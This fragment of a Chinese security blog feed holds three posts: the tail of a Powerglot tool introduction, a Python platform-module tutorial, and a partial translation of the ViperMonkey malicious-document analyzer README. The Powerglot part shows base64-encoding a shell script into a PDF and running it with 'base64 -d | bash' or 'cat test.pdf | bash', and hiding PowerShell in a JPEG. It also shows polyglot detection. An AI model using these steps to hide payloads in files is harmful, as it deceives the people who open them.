class="keyword">in</span> PDF (Ej-linenum.sh)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create b64.sh with your favourite payload</span></span><br><span class="line">base64 Linenum.sh -w 0 &gt; b64.sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> Edit b64.sh</span></span><br><span class="line">echo &quot;code in b64.sh&quot; | base64 -d | bash;</span><br><span class="line"><span class="meta">#</span><span class="bash"> python3 powerglot -o b64.sh sample.pdf test.pdf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> file test.pdf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> xpdf test.pdf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Execute payload</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat test.pdf | bash or chmod +x test.pdf; ./test.pdf</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># Example 5 - Powershell in JPEG (polyglot)</span><br><span class="line"># python3 powerglot.py -o script.ps1 cat.jpeg cat-ps.jpeg</span><br><span class="line"># file cat-ps.jpeg</span><br><span class="line"># feh cat-ps.jpeg</span><br><span class="line"># Execute payload (example)</span><br><span class="line"># cat cat-ps.jpeg | pwsh</span><br><span class="line">PS /home/alfonso/PowerGlot/POWERSHELL&gt; get-process;&lt;#hola &lt;# mundo#&gt;</span><br><span class="line"> NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName</span><br><span class="line"> ------    -----      -----     ------      --  -- -----------</span><br><span class="line">      0     0,00       2,70       0,00     830 829 (sd-pam)</span><br><span class="line">      0     0,00       0,00       0,00      75   0 acpi_thermal_pm</span><br><span class="line">      0     0,00       4,80       0,00    1217 854 agent</span><br><span class="line">      0     0,00       1,70       0,00     748 748 agetty</span><br><span class="line">      0     0,00      40,77       1,01    1198 854 applet.py</span><br><span class="line">      0     0,00       6,29       0,00     938 938 at-spi-bus-launcher</span><br><span class="line">      0     0,00       6,61       5,64     953 938 at-spi2-registryd</span><br><span class="line">      0     0,00       0,00       0,00     131   0 ata_sff</span><br><span class="line">      0     0,00       1,77       0,00    8906 …78 atom</span><br><span class="line">      0     0,00     218,81     585,95    8908 …78 atom</span><br><span class="line">      0     0,00     236,18     176,24    8947 …78 atom</span><br><span class="line">      0     0,00     142,14       2,51    9009 …78 atom</span><br><span class="line">      0     0,00      81,54       3,32    8932 …78 atom --type=gpu-process --enable-features=SharedArrayBuffer -…</span><br><span class="line">      0     0,00      39,44       0,01    8910 …78 atom --type=zygote --no-sandbox</span><br><span class="line">      0     0,00       5,62       0,11    1370 …70 bash</span><br><span class="line">      0     0,00       5,36       0,66    5278 …78 bash</span><br><span class="line">      0     0,00       6,34       1,48    6778 …78 bash</span><br><span class="line">      0     0,00       0,00       0,00      68   0 blkcg_punt_bio</span><br><span class="line">      0     0,00      46,73       2,20    1199 854 blueman-applet</span><br><span class="line">      0     0,00      50,25       1,64    1301 854 blueman-tray</span><br></pre></td></tr></table></figure><p>以下为检测 Polyglots 的一些粟子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">python3 powerglot.py -d ./</span></span><br><span class="line">--= [Detecting polyglots] --=</span><br><span class="line">..............................................................</span><br><span class="line">[Suspicious file]-[ ./cat-end-extra2.jpg ]..</span><br><span class="line">[Suspicious file]-[ ./cat-end-extra3.jpg ][Polyglot Stegosploit][EOF Signature: */ --&gt;]</span><br><span class="line">.................................................................................</span><br><span class="line">[Suspicious file]-[ ./cat-end-extra1.jpg ]..</span><br></pre></td></tr></table></figure><h2 id="将来我们要做的"><a href="#将来我们要做的" class="headerlink" title="将来我们要做的"></a>将来我们要做的</h2><ul><li>我们正在努力支持使用多种文件格式对 Polyglots 进行信息编码。当前支持 JPEG 和 PDF。</li><li>我们正致力于整合不同格式的多基因检测规则。目前可检测到 JPEG 文件中是否存在隐写 (在 FFD9 之后添加 */–&gt;)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;工具链接：&lt;a href=&quot;https://github.com/mindcrypt/powerglot&quot;&gt;https://github.com/mindcrypt/powerglot&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;a class=</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="Powerglot" scheme="https://zeronohacker.github.io/tags/Powerglot/"/>
    
  </entry>
  
  <entry>
    <title>Python 中的 platform 模块</title>
    <link href="https://zeronohacker.github.io/2020/09/11/the-platform-module-in-python/"/>
    <id>https://zeronohacker.github.io/2020/09/11/the-platform-module-in-python/</id>
    <published>2020-09-11T14:07:34.000Z</published>
    <updated>2021-09-19T14:13:12.708Z</updated>
    
    <content type="html"><![CDATA[<p>Python 中的 platform 模块提供了一些函数可用来获取运行程序的解释器、操作系统和硬件平台的信息。</p><p>关于此模块的官方说明：<a href="https://docs.python.org/3.8/library/platform.html#module-platform">https://docs.python.org/3.8/library/platform.html#module-platform</a></p><h2 id="解释器"><a href="#解释器" class="headerlink" title="解释器"></a>解释器</h2><p>有 4 个函数可以获取当前 Python 解释器的有关信息</p><ul><li>python_version() – 返回 Python 的主版本号、次版本号和补丁版本号</li><li>python_version_tuple() – 以元组的形式返回 Python 的主版本号、次版本号和补丁版本号</li><li>python_compiler() – 返回解释器的编译器信息</li><li>python_build() – 解释器构建的版本串</li></ul><p>举个粟子，在 vim 下新建 platform_python.py，敲入以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Version      :&#x27;</span>, platform.python_version())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Version tuple:&#x27;</span>, platform.python_version_tuple())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Compiler     :&#x27;</span>, platform.python_compiler())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Build        :&#x27;</span>, platform.python_build())</span><br></pre></td></tr></table></figure><p>然后乾坤大法一按，oh 了~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Version      : <span class="number">3.7</span><span class="number">.3</span></span><br><span class="line">Version <span class="built_in">tuple</span>: (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">Compiler     : Clang <span class="number">11.0</span><span class="number">.3</span> (clang-<span class="number">1103.0</span><span class="number">.32</span><span class="number">.62</span>)</span><br><span class="line">Build        : (<span class="string">&#x27;default&#x27;</span>, <span class="string">&#x27;Aug  4 2020 19:30:55&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>platform 模块中有个 platform 函数返回一个通用的平台标识符，该标识符为一个字符串，这个函数接受两个可选的布尔参数。如果 aliased 为 True，则返回值中的名会从一个正式名转换为更常用的格式。如果 terse 为 True，则会返回一个最小值，即去除某些部分，而不是返回完整的串，同样在另一文件中敲入以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Normal   :&#x27;</span>, platform.platform())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Aliased  :&#x27;</span>, platform.platform(aliased=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Terse    :&#x27;</span>, platform.platform(terse=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure><h2 id="操作系统和硬件信息"><a href="#操作系统和硬件信息" class="headerlink" title="操作系统和硬件信息"></a>操作系统和硬件信息</h2><p>platform 模块中的 uname 函数可获取解释器的操作系统和硬件的更多详细信息，它返回的是一个元组，其中包含系统、节点、发行号、版本、机器和处理器值。可通过下列几个函数来访问各自相应的值</p><ul><li>system() – 操作系统名</li><li>node() – 服务器主机名，不是完全限定名</li><li>release() – 操作系统发行号</li><li>version() – 更详细的系统版本信息</li><li>machine() – 硬件类型标识符，如 ‘i386’</li><li>processor() – 处理器实际标识符 (有些情况下与 machine() 值相同)</li></ul><p>不多说，上代码验证下，先搓搓手~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;uname    :&#x27;</span>, platform.uname())</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system   :&#x27;</span>, platform.system())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;node     :&#x27;</span>, platform.node())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;release  :&#x27;</span>, platform.release())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;version  :&#x27;</span>, platform.version())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;machine  :&#x27;</span>, platform.machine())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;processor:&#x27;</span>, platform.processor())</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uname    : uname_result(system=&#x27;Darwin&#x27;, node=&#x27;zeronohacker.local&#x27;, release=&#x27;19.6.0&#x27;, version=&#x27;Darwin Kernel Version 19.6.0: Thu Jun 18 20:49:00 PDT 2020; root:xnu-6153.141.1~1/RELEASE_X86_64&#x27;, machine=&#x27;x86_64&#x27;, processor=&#x27;i386&#x27;)</span><br><span class="line">system   : Darwin</span><br><span class="line">node     : zeronohacker.local</span><br><span class="line">release  : 19.6.0</span><br><span class="line">version  : Darwin Kernel Version 19.6.0: Thu Jun 18 20:49:00 PDT 2020; root:xnu-6153.141.1~1/RELEASE_X86_64</span><br><span class="line">machine  : x86_64</span><br><span class="line">processor: i386</span><br></pre></td></tr></table></figure><h2 id="可执行程序体系结构"><a href="#可执行程序体系结构" class="headerlink" title="可执行程序体系结构"></a>可执行程序体系结构</h2><p>platform 模块中的 architecture 函数可查看程序的体系结构信息，第一个参数是可执行程序路径 (默认为 sys.executable，即 Python 解释器)。返回值是一个元组，包含位体系结构和使用的链接格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;interpreter  :&#x27;</span>, platform.architecture())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;/bin/ls      :&#x27;</span>, platform.architecture(<span class="string">&#x27;/bin/ls&#x27;</span>))</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">interpreter  : (&#x27;64bit&#x27;, &#x27;&#x27;)</span><br><span class="line">/bin/ls      : (&#x27;64bit&#x27;, &#x27;&#x27;)</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>关于 platform 模块的主要用到的就是以上这几种，如果还需其它，可参阅官方文档。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python 中的 platform 模块提供了一些函数可用来获取运行程序的解释器、操作系统和硬件平台的信息。&lt;/p&gt;
&lt;p&gt;关于此模块的官方说明：&lt;a href=&quot;https://docs.python.org/3.8/library/platform.html#modu</summary>
      
    
    
    
    <category term="Python" scheme="https://zeronohacker.github.io/categories/Python/"/>
    
    
    <category term="Python" scheme="https://zeronohacker.github.io/tags/Python/"/>
    
    <category term="platform" scheme="https://zeronohacker.github.io/tags/platform/"/>
    
  </entry>
  
  <entry>
    <title>恶意文档分析工具 ViperMonkey 使用说明</title>
    <link href="https://zeronohacker.github.io/2020/09/09/maldoc-analysis-tool-vipermonkey-instruction/"/>
    <id>https://zeronohacker.github.io/2020/09/09/maldoc-analysis-tool-vipermonkey-instruction/</id>
    <published>2020-09-09T13:16:42.000Z</published>
    <updated>2021-09-19T14:05:55.013Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文为 ViperMonkey 的中文版，原文链接：<a href="https://github.com/decalage2/ViperMonkey/">https://github.com/decalage2/ViperMonkey/</a></p></blockquote><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/decalage2/ViperMonkey"><img src="https://github-readme-stats.vercel.app/api/pin/?username=decalage2&repo=ViperMonkey&theme=blue-green&show_owner=true"/></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ViperMonkey 是一个用 Python 写的 VBA 仿真模拟引擎，用来分析和反混淆 MS Office 文件 (Word，Excel，PowerPoint，Publisher 等等) 中包含的恶意宏代码，你可以查看 <a href="http://decalage.info/vba_emulation">这篇文章</a>，一个用 vipermonkey 分析的真实案例。在 2019 年欧洲黑帽大会会议上 ViperMonkey 被拿来做过演示 –&gt; <a href="https://decalage.info/en/bheu2019">演讲 PPT 下载</a> 和 <a href="https://youtu.be/l5sMPGjtKn0?list=PLH15HpR5qRsXiPOP3gxN6ultoj0rAR6Yn&amp;t=1118">YouTube 视频</a>。</p><p>ViperMonkey 项目由 Philippe Lagadec 在 2015-2016 年创建，该项目保存在 <a href="https://github.com/decalage2/ViperMonkey">https://github.com/decalage2/ViperMonkey</a> 中。自 2017 年 11 月以来，大部分开发工作由 Kirk Sayre 和其他贡献者在存储库 <a href="https://github.com/kirk-sayre-work/ViperMonkey">https://github.com/kirk-sayre-work/ViperMonkey</a> 中完成。主存储库会定期进行同步，但是最新的改进通常是在 Kirk 的版本中。</p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><ul><li>ViperMonkey 是分析恶意文档的实验性 VBA 引擎，它适用于部分恶意文档并非全部</li><li>目前，VBA 仿真模拟引擎的解析速度非常慢 (有关如何提高速度的信息，请参见加速部分)</li><li>VBA 仿真模拟非常复杂和困难，因为 VBA 会调用所有可能出现的 DLL 和 ActiveX 对象</li><li>这个开源项目只是在我的业余时间进行开发，所以不要期待奇迹，如果你愿意提供帮助，我将不胜感激</li></ul><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><div class="timeline"><div class="timenode"><div class="meta"><p><p>2018-03-22 v0.06</p></p></div><div class="body"><ol><li>添加新特性和 bug 修复 by Kirk Sayre</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2018-03</p></p></div><div class="body"><ol><li>增加了对解析一些无效的 VBA 语句的支持</li><li>其他解析修复</li><li>增加了对在非标准函数上启动仿真模拟的支持</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2018-02</p></p></div><div class="body"><ol><li>增加对 <code>Environ、IIf、Base64DecodeString、CLng、Close、Put、Run、InStrRev、LCase、RTrim、LTrim、AscW、AscB</code> 和 <code>CurDir</code> 的支持</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2018-01</p></p></div><div class="body"><ol><li>增加对在模拟运行中释放文件的支持</li><li>增加对 <code>For Each loops</code> 的支持</li><li>增加对 <code>While Wend loops</code> 的支持</li><li>能够处理 <code>Exit Do</code></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2018-01-12 v0.05</p></p></div><div class="body"><ol><li>添加新特性和 bug 修复 by Kirk Sayre</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2017-12-15</p></p></div><div class="body"><ol><li>增加对 <code>Select</code> 和 <code>Do Loops</code> 的支持</li><li>增加对 <code>End Sub</code> 和 返回 0 个参数语句的支持</li><li>增加对 <code>#if</code> 结构的支持</li><li>每个 VBA 流都在一个单独的线程中进行解析</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2017-11-28</p></p></div><div class="body"><ol><li>增加对 Private 类型声明的解析支持</li><li>在最终报告中记录 <code>CreateProcessA</code> 的调用</li><li>处理本地定义的 <code>Application.Run()</code></li></ol></div></div><div class="timenode"><div class="meta"><p><p>2017-11-23</p></p></div><div class="body"><ol><li>增加对 <code>Abs、Fix、Hex、String、CByte、Atn、Dir、RGB、Log、Cos、Exp、Sin、Str</code> 和 <code>Val</code> 的支持</li><li>增加对 <code>Exit Function</code> 的支持</li><li>更改了数学运算符，使其也能处理整数的字符串表示</li><li>在循环上添加了可配置的迭代限制</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2017-11-14</p></p></div><div class="body"><ol><li>增加对 <code>InStr、Replace、Sgn、Sqr、UBound、LBound、Trim、StrConv、Split、StrReverse</code> 和 <code>Int</code> 函数的支持</li><li>增加对字符串特征标注的支持</li><li>增加对负整数的支持</li><li>增加对 <code>if-than-else</code> 语句的支持</li><li>增加了对声明的常量和全局变量初始值的支持</li><li>处理布尔表达式当中变量赋值问题</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2017-11-03</p></p></div><div class="body"><ol><li>增加对 <code>Left()、Right()、Array()</code> 和 <code>BuiltInDocumentProperties()</code> 的支持</li><li>增加对全局变量的支持</li><li>修复一些解析 bug</li><li>增加对 <code>AutoClose()</code> 的支持</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2016-09-26</p></p></div><div class="body"><ol><li>首次推出版本</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2015-02-28</p></p></div><div class="body"><ol><li>第一个开发版本</li></ol></div></div></div><h2 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h2><p>出于性能原因，强烈建议使用 PyPy (快 5 倍)，但是如果你不能使用 PyPy，也可以使用普通的 Python 解释器 (CPython) 运行 ViperMonkey。</p><h3 id="使用-PyPy-安装-推荐"><a href="#使用-PyPy-安装-推荐" class="headerlink" title="使用 PyPy 安装 (推荐)"></a>使用 PyPy 安装 (推荐)</h3><ul><li>如果你的系统没有安装 PyPy，可在 <a href="http://pypy.org/download.html">http://pypy.org/download.html</a> 上下载 PyPy2.7 (不是 3.x)</li><li>使用 pypy 检查 pip 是否已安装，运行 <code>pypy -m pip</code></li><li>如果 pip 也没安装，windows 下运行 <code>pypy -m ensurepip</code>，Linux/Mac 下运行 <code>sudo -H pypy -m ensurepip</code></li><li>确保 pip 为最新版本，运行 <code>pypy -m pip install -U pip</code></li><li>下载 ViperMonkey 文件: <a href="https://github.com/decalage2/ViperMonkey/archive/master.zip">https://github.com/decalage2/ViperMonkey/archive/master.zip</a></li><li>将下载下来的解压到一个文件夹内，然后进入该文件内打开 shell/cmd</li><li>如果是在 ubuntu 下，需安装 pypy-dev，运行 <code>sudo apt-get install pypy-dev</code></li><li>安装依赖，windows 下运行 <code>pypy -m pip install -U -r requirements.txt</code>，Linux/Mac 下运行 <code>sudo -H pypy -m pip install -U -r requirements.txt</code></li><li>检查下 ViperMonkey 运行是否会出错，运行 <code>pypy vmonkey.py</code></li></ul><h3 id="使用-CPython-安装"><a href="#使用-CPython-安装" class="headerlink" title="使用 CPython 安装"></a>使用 CPython 安装</h3><ul><li>请确保你安装了最新的 Python2.7 版本 <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></li><li>如果你同时安装了 Python2 和 Python3 版本，在下面的命令中请使用 pip2 替代 pip</li><li>确保 pip 更新至最新版本，运行 <code>pip install -U pip</code></li><li>使用 pip 下载 ViperMonkey 以及所需的依赖</li></ul><div class="tabs" id="install-standard-version"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#install-standard-version-1">Windows</button></li><li class="tab"><button type="button" data-href="#install-standard-version-2">Linux/Mac</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="install-standard-version-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U https://github.com/decalage2/ViperMonkey/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="install-standard-version-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install -U https://github.com/decalage2/ViperMonkey/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><ul><li>最后检测运行 ViperMonkey 是否会出错，在任意目录下打开 shell/cmd，简单运行 vmonkey 即可</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>解析文档中的 VBA 宏</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmonkey &lt;file&gt;</span><br></pre></td></tr></table></figure><p>如果你要加快分析速度 (请参见加速部分)，可以这样做</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypy vmonkey.py -s &lt;file&gt;</span><br></pre></td></tr></table></figure><p>如果嫌输出太慢和太冗长，可以使用 -l 选项降低日志记录级别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmonkey -l warning &lt;file&gt;</span><br></pre></td></tr></table></figure><h3 id="oletools-版本"><a href="#oletools-版本" class="headerlink" title="oletools 版本"></a>oletools 版本</h3><p>ViperMonkey 需要 oletools 的最新版本，至少 v0.52.3，有几种方式来安装 oletools</p><ul><li>通过运行 <code>pip install -U oletools</code> 安装最新的 oletools 版本</li><li>按照 <a href="https://github.com/decalage2/oletools/wiki/Install#how-to-install-the-latest-development-version">此处</a> 所述那样，使用 pip 安装 oletools 的最新开发版本</li></ul><h3 id="如何加速"><a href="#如何加速" class="headerlink" title="如何加速"></a>如何加速</h3><span class='p blue'>pypy</span><p>ViperMonkey 使用默认的解析库可能需要很长时间才能解析某些样本，通过使用 pypy 而不是常规的 Python 解释器运行 ViperMonkey，可以大大加快 ViperMonkey 的运行速度 (能快 5 倍左右)。 要使用 pypy，请执行以下操作</p><ul><li><p>按照 <a href="https://pypy.org/download.html">此处</a> 的说明来安装 pypy</p></li><li><p>安装以下 Python 软件包，可以下载 .tar.gz 并为每个软件包运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pypy setup.py install</span><br></pre></td></tr></table></figure><p>(请注意使用 pypy 而不是 python) 来完成</p><ul><li><a href="https://pypi.python.org/pypi/setuptools">setuptools</a></li><li><a href="https://pypi.python.org/pypi/colorlog">colorlog</a></li><li><a href="https://pypi.python.org/pypi/olefile">olefile</a></li><li><a href="https://pypi.python.org/pypi/PrettyTable">prettytable</a></li><li><a href="https://pypi.python.org/pypi/pyparsing/2.2.0">pyparsing</a></li></ul></li></ul><span class='p blue'>去除无用的语句</span><p>ViperMonkey 命令行选项 -s 告诉 ViperMonkey 在解析和仿真模拟之前从 Visual Basic 宏代码中删除无用的语句。对于某些恶意文档，这可以大大加快分析速度。</p><span class='p blue'>模拟文件写入</span><p>ViperMonkey 模拟文件写入行为，ViperMonkey 分析结果中报告了释放文件的 SHA256 哈希值，实际释放的文件保存在目录 MALDOC_artifacts/ 中，其中 MALDOC 是分析的恶意文件名称。</p><span class='p blue'>模拟特定的 VBA 函数</span><p>默认情况下，ViperMonkey 从标准宏自动运行函数 (如 <strong>AutoOpen，Document_Open，Document_Close</strong> 等) 开始模拟行为。<strong>在某些情况下，你可能希望从非标准自动运行函数开始模拟行为，可通过 -i 命令行选项支持此功能</strong>。要从 Foo 函数开始模拟行为，请使用命令行选项 <code>-i Foo</code>。要模拟从多个非标准入口点开始的行为，请使用命令行选项 <code>-i &quot;Foo，Bar，Baz&quot;</code> (请注意，入口点函数名称以逗号分隔，并且必须用双引号引起来)。</p><h2 id="API-接口"><a href="#API-接口" class="headerlink" title="API 接口"></a>API 接口</h2><p>ViperMonkey 还包含 API 接口，可用于对示例进行更精细的控制仿真模拟或可以将其集成到现有项目中。API 允许你遍历和仿真模拟 VBA 代码的某些部分，并采用按需解析的方法来提高速度。</p><h3 id="直接-VBA-仿真模拟"><a href="#直接-VBA-仿真模拟" class="headerlink" title="直接 VBA 仿真模拟"></a>直接 VBA 仿真模拟</h3><p>模拟某些代码的最简单方法是使用 vipermonkey.eval() 函数，这将解析并模拟每行，并返回最后一行的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line"><span class="built_in">print</span> vipermonkey.<span class="built_in">eval</span>(<span class="string">&#x27;&quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)&#x27;</span>)</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dim m1, m2, m3 As String</span></span><br><span class="line"><span class="string">m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">m2 = &quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)</span></span><br><span class="line"><span class="string">m3 = &quot;!!!&quot;</span></span><br><span class="line"><span class="string">m1 &amp; m2 &amp; m3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> vipermonkey.<span class="built_in">eval</span>(vba_code)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">world</span><br><span class="line">hello world!!!</span><br></pre></td></tr></table></figure><p>如果代码在最后一行没有返回任何内容，或者你想检查其他变量，可以提供一个 Context 对象，Context 对象用于保存所有局部/全局变量，创建的文件对象以及执行的唯一操作 (稍后会详细介绍)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dim m1, m2, m3, result As String</span></span><br><span class="line"><span class="string">m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">m2 = &quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)</span></span><br><span class="line"><span class="string">m3 = &quot;!!!&quot;</span></span><br><span class="line"><span class="string">result = m1 &amp; m2 &amp; m3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br><span class="line"><span class="built_in">print</span> context.<span class="built_in">locals</span></span><br><span class="line"><span class="built_in">print</span> context[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># same as context.locals[&#x27;result&#x27;]</span></span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;m1&#x27;: &#x27;hello &#x27;, &#x27;result&#x27;: &#x27;hello world!!!&#x27;, &#x27;m3&#x27;: &#x27;!!!&#x27;, &#x27;m2&#x27;: &#x27;world&#x27;&#125;</span><br><span class="line">hello world!!!</span><br></pre></td></tr></table></figure><h3 id="检查-VBA-代码"><a href="#检查-VBA-代码" class="headerlink" title="检查 VBA 代码"></a>检查 VBA 